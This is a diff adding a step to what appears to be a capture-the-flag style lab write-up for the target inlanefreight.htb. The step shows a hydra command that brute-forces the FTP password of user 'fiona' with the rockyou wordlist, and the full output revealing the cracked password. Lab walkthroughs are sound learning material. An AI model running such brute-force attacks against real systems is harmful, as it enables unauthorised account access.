@@ -234,5 +234,27 @@ Target domain ............ inlanefreight.htb
 
 ```
 
-Step3. We will now need password as well we will enumerate it by using hydra and we will get our password by bruteforcing.
+Step3. We will now need password as well we will enumerate it by using hydra and we will get our password by bruteforcing. we have founded our password.
+```bash
+┌──(root㉿kali)-[~]
+└─# hydra -l fiona \                                      
+-P /usr/share/wordlists/rockyou.txt \
+-t 1 \
+-v \
+10.129.111.81 ftp
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-15 23:15:37
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
+[DATA] attacking ftp://10.129.111.81:21/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[STATUS] 26.00 tries/min, 26 tries in 00:01h, 14344373 to do in 9195:07h, 1 active
+[STATUS] 25.00 tries/min, 75 tries in 00:03h, 14344324 to do in 9562:53h, 1 active
+[21][ftp] host: 10.129.111.81   login: fiona   password: 987654321
+[STATUS] attack finished for 10.129.111.81 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-15 23:19:05
+
+```
 
